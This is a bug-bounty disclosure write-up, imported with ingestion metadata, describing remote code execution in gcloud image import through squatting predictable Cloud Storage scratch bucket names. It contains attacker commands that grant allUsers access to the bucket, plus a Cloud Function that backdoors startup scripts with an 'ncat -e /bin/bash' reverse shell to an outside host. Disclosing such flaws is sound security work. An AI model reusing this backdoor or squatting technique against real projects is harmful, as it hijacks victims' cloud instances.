---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-09-19_remote-code-execution-in-import-image-task-via-storage-bucket-squatting.md
original_filename: 2020-09-19_remote-code-execution-in-import-image-task-via-storage-bucket-squatting.md
title: Remote code execution in import image task via storage bucket squatting
category: documents
detected_topics:
- command-injection
- automation-abuse
- cloud-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- cloud-security
language: en
raw_sha256: e389f54f23d919e967f6f769d5a365e66f98a1e07e05276bb2f966660ebcba14
text_sha256: ecd08b84764f70fd2c92dafc9f57da32306f26ac39115c9fc028bc7e8c84a8cd
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Remote code execution in import image task via storage bucket squatting

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-09-19_remote-code-execution-in-import-image-task-via-storage-bucket-squatting.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `e389f54f23d919e967f6f769d5a365e66f98a1e07e05276bb2f966660ebcba14`
- Text SHA256: `ecd08b84764f70fd2c92dafc9f57da32306f26ac39115c9fc028bc7e8c84a8cd`


## Content

---
title: "Remote code execution in import image task via storage bucket squatting"
page_title: "Remote code execution in import image task via storage bucket squatting | Anthony Weems"
url: "https://lf.lc/vrp/168987557/"
final_url: "https://amlw.dev/vrp/168987557/"
authors: ["Anthony Weems"]
programs: ["Google"]
bugs: ["RCE"]
bounty: "3,133.70"
publication_date: "2020-09-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4253
---

#  Remote code execution in import image task via storage bucket squatting 

September 19, 2020

### Vulnerability Details#

gcloud has subcommands for importing/exporting compute images. These commands create Cloud Build tasks which launch an instance in your project to perform the import/export task. They use the open source [GoogleCloudPlatform/compute-image-tools](https://github.com/GoogleCloudPlatform/compute-image-tools) repo to execute these workflows.

Both workflows use a “scratch” storage bucket for storing logs, scratch data, and startup scripts. The bucket name formats are below:
  
  
  export: "<project-id>-daisy-bkt-us"
  import: "<project-id>-daisy-bkt"
  

If this bucket does not exist, it creates it within the user’s project, otherwise, it simply attempts to write to the bucket. There is no verification that the “scratch” bucket is valid. As the bucket name is not a domain, nor does it contain the word Google, an attacker can register these scratch buckets for any target accounts.

### Attack Scenario#

An attacker can effectively “squat” bucket names for projects they expect might perform an image import/export at some point in the future.

Requirements for the attack:

  1. attacker must know the project ID of their victim
  2. victim must not have the scratch bucket (typically created on first run of images import/export)
  3. attacker must create a bucket matching `<project-id>-daisy-bkt`
  4. attacker must grant access to the bucket (e.g. grant allUsers the storage.buckets.list, storage.objects.get, and storage.objects.create permissions)

For the export task, the workflow saves the full image in the scratch bucket. This means an attacker can read any image exported by the victim.

For the import task, the workflow uploads a startup_script and several Python files used during the import process. The attacker can listen for updates to their bucket with a Cloud Function, replace these files after upload, and backdoor the scripts used by the import process. When the instance launches, it will load their backdoored script and give them control of an instance in the victim account. This effectively grants the attacker control of the `<project-id>@cloudbuild.gserviceaccount.com` for the victim project with the scope `https://www.googleapis.com/auth/devstorage.read_only`.

#### Attacker setup#

Create the bucket and grant permission to allUsers:
  
  
  gsutil mb gs://psgttllaecgoqtqq-daisy-bkt
  gsutil iam ch "allUsers:admin" gs://psgttllaecgoqtqq-daisy-bkt
  

Note: the example below uses admin, but only storage.buckets.list, storage.objects.get, and storage.objects.create are required.

Set up a Cloud Function to trigger on writes and backdoor the startup script:

**Screenshot of Cloud Function with trigger on bucket:** ![Screenshot of Cloud Function with trigger on bucket](/assets/vrp/168987557-cloud-function.png)

Source code:
  
  
  from google.cloud import storage
  from google.cloud.storage import Blob
  
  client = storage.Client()
  
  # NOTE: replace this with your desired commands to execute in the victim instance
  backdoor_sh = """#!/bin/bash
  apt-get update
  apt-get install -y nmap
  ncat -e /bin/bash lf.lc 4444
  """
  
  def backdoor(event, context):
  """Triggered by a change to a Cloud Storage bucket."""
  name = event['name']
  print(f'Processing file write: {name}')
  bucket = client.get_bucket(event['bucket'])
  if 'startup_script' in name or name.endswith('.sh'):
  print(f'Backdooring: {name}')
  blob = bucket.get_blob(name)
  
  # simple check to avoid repeatedly backdooring the object
  if b'ncat' not in blob.download_as_string():
  blob = bucket.get_blob(name)
  blob.upload_from_string(backdoor_sh, content_type=blob.content_type)
  

#### Victim setup#

Run an import:
  
  
  gcloud compute images import my-ubuntu --os=centos-8 \
  --source-image=projects/centos-cloud/global/images/centos-8-v20200910
  

**Screenshot of victim running gcloud images import:** ![Screenshot of victim running gcloud images import](/assets/vrp/168987557-import.png)

#### Result#

**Screenshot of bucket (showing files created by victim import job):** ![Screenshot of bucket \(showing files created by victim import job\)](/assets/vrp/168987557-bucket.png)

**Screenshot of shell after import job launched using backdoored startup script:** ![Screenshot of shell after import job launched using backdoored startup script](/assets/vrp/168987557-shell.png)

### Timeline#

  * 2020-09-19: Issue reported to Google VRP
  * 2020-09-22: Issue triaged
  * 2020-09-22: Internal bug report filed
  * 2020-09-29: VRP issued reward ($3133.70)
